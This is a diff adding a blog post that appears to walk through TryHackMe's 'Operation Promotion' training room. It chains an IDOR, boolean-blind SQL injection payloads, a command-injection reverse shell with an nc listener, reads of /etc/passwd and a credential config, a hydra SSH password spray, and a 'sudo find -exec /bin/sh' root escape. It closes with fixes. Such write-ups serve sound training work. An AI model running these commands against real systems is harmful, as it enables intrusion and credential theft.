@@ -1,0 +1,168 @@
+---
+title: 'Operation Promotion'
+description: 'An IDOR in an admin lookup reveals a hidden maintenance page; a boolean-blind SQLi dumps the user table; a command-injection ping page gives a www-data shell; a targeted wordlist cracks an SSH login, and sudo find hands over root.'
+date: 2026-06-24
+platform: tryhackme
+room: 'Operation Promotion'
+roomUrl: 'https://tryhackme.com/room/operationpromotion'
+difficulty: easy
+tags:
+  - 'web'
+  - 'sql-injection'
+  - 'idor'
+  - 'command-injection'
+  - 'password-cracking'
+  - 'sudo'
+  - 'linux'
+  - 'privesc'
+vulnClasses:
+  - 'sql injection'
+  - 'insecure direct object reference'
+  - 'insecure command execution'
+  - 'weak credentials'
+  - 'insecure sudo configuration'
+translation: done
+draft: false
+---
+
+_A walkthrough of the "Operation Promotion" room from TryHackMe (RecruitCorp Careers Portal). We pivot from an IDOR to a hidden maintenance page, script a boolean-blind SQL injection to dump every user, turn a diagnostics page into a shell, crack one SSH login with a surgically small wordlist, and ride a_ _`sudo find`_ _misconfiguration to root._
+
+> Operation Promotion is an authorized training challenge on TryHackMe; everything here was performed against a legal practice target. Both flags and every recovered credential are shown as `THM{<redacted>}` / `<redacted>` — real on the box, withheld here.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Apache careers portal with a `robots.txt`-disallowed `/admin/` → an **IDOR** in `admin/users/lookup.php?id=` enumerates accounts and exposes a `sysmaint` service account plus a hidden `sysmaint-checks/ping.php` → the lookup is **blind-SQL-injectable**, scripted to dump all 9 users → the ping page is **command-injectable** via its `hosts` parameter → **reverse shell as www-data** → `db.conf` + `/etc/passwd` reveal user `jford` → the bcrypt hash won’t crack, so build a tiny `spring2026`-based wordlist with hashcat rules and `hydra` the SSH login (`spring2026!`) → user flag → `sudo -l` shows **NOPASSWD** **`/usr/bin/find`** → `find -exec /bin/sh -p` → root.
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-ip>
+```
+
+`nmap` shows SSH, an Apache careers site, and Samba:
+
+```text
+22/tcp  open  ssh          OpenSSH 9.6p1 Ubuntu
+80/tcp  open  http         Apache httpd 2.4.58   # RecruitCorp - Careers Portal
+139/tcp open  netbios-ssn  Samba smbd 4
+445/tcp open  netbios-ssn  Samba smbd 4
+```
+
+A null SMB session exposes a read-only `public` share with only a placeholder `README.txt`. `robots.txt` disallows `/admin/`, and a content scan confirms it — that’s where the action is.
+
+### **The vulnerability**
+
+The admin area exposes `users/lookup.php?id=N`. Two flaws live in that one parameter: it is an **IDOR** (we can read any record by iterating the id) and it is **SQL-injectable** (the id flows into a query unsanitised). The IDOR leaks a `sysmaint` service account and a hidden maintenance directory; the SQLi lets us dump every credential.
+
+<Callout type="insight">
+
+The injection is **boolean-blind**: the login/lookup returns a 3xx redirect when the injected condition is true and a 200 when it is false. That single yes/no signal is a perfect oracle — wrap it in a binary search over `UNICODE(SUBSTR(...))` and you extract usernames and passwords one character at a time, no error messages or data reflection required.
+
+</Callout>
+
+### **Step 1 — IDOR → hidden maintenance page**
+
+Iterating `lookup.php?id=` enumerates users and turns up the `sysmaint` service account, which points at a maintenance area containing `ping.php` under `admin/.../sysmaint-checks/`. Keep that page for later — it’s the foothold.
+
+### **Step 2 — boolean-blind SQLi → dump the user table**
+
+`sqlmap` confirms the injection point; a small purpose-built script makes the extraction reliable. The oracle is “did the response redirect?”:
+
+```text
+# oracle: injected condition true -> 301/302/303
+'  OR 1=1 --   -> redirect (true)
+'  OR 1=2 --   -> 200      (false)
+```
+
+Binary-searching each character via `UNICODE(SUBSTR((SELECT ... FROM users LIMIT 1 OFFSET n),p,1))` dumps all nine rows:
+
+```text
+Recovered credentials (values redacted):
+  admin:<redacted>
+  mvasquez / tparker / lhayes / kchen / rdavis / sysmaint / jbailey / aokafor : <redacted>
+```
+
+### **Step 3 — command injection → shell as www-data**
+
+The maintenance `ping.php` takes a `hosts` parameter and runs it through a shell. Injecting a command fetches and executes our payload; a listener catches the shell:
+
+```text
+nc -lvnp 4444
+# uid=33(www-data) gid=33(www-data)
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+The app config and `/etc/passwd` name our next target:
+
+```text
+www-data@recruitcorp:/var/www/html/config$ cat db.conf
+# db_user=jford
+# db_pass_hash=<redacted bcrypt hash>
+www-data@recruitcorp:...$ grep bash /etc/passwd
+# jford:x:1001:1001::/home/jford:/bin/bash
+```
+
+### **Step 4 — crack a surgical wordlist → SSH as jford (flag)**
+
+The bcrypt hash resists cracking and the dumped DB passwords don’t help. The site copy hints at a seasonal password (“Seasons combined with years”), so we seed `spring2026` and expand it with a hashcat rule set, then spray SSH:
+
+```text
+echo 'spring2026' > base.txt
+hashcat --stdout base.txt -r /usr/share/hashcat/rules/dive.rule > wordlist.txt   # ~98k candidates
+hydra -l jford -P wordlist.txt ssh://$IP
+# [22][ssh] login: jford   password: <redacted>   (a spring2026 variant)
+```
+
+```text
+ssh jford@$IP
+jford@recruitcorp:~$ cat user.txt
+THM{<redacted>}
+```
+
+### **Step 5 — sudo find → root (flag)**
+
+`jford` may run `find` as root without a password — a textbook GTFOBins escape:
+
+```text
+jford@recruitcorp:~$ sudo -l
+# (root) NOPASSWD: /usr/bin/find
+jford@recruitcorp:~$ sudo /usr/bin/find . -exec /bin/sh -p \; -quit
+# whoami -> root
+# cat /root/flag.txt
+THM{<redacted>}
+```
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 \~9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). An unauthenticated attacker chains an IDOR and a blind SQL injection to dump every account, then a command injection for code execution as www-data. A weak, guessable SSH password and an over-permissive `sudo` rule (`NOPASSWD` on `find`) escalate to full root — complete compromise of the host and the recruitment database.
+
+</Callout>
+
+### **Recommended fix**
+
+<Callout type="fix">
+
+- **Use parameterised queries** for `lookup.php` and enforce authorisation so a user can’t read arbitrary records by id (fixes both the SQLi and the IDOR).
+- **Never pass user input to a shell** in the diagnostics page — validate the host and call an API without a shell.
+- **Enforce strong passwords**; a `season+year` password falls to a tiny rule-based wordlist.
+- **Tighten sudo.** Granting `NOPASSWD` on `find` (or any binary with `-exec`) is equivalent to granting root. Scope sudo to specific, non-escaping commands.
+
+</Callout>
+
+### **Takeaways**
+
+- **One parameter, two bugs.** The same `id` was both an IDOR and a SQL injection point — always test identifiers for both.
+- **A redirect is a perfectly good blind-SQLi oracle.** You don’t need error output to exfiltrate a whole table.
+- **Password policies beat hash strength.** bcrypt protected the hash, but a guessable scheme undid it anyway.
+- **Check** **`sudo -l`** **first.** `find` on the list is a one-line path to root.
+
+Operation Promotion is a clean easy-box chain that rewards careful enumeration. Thanks for reading.
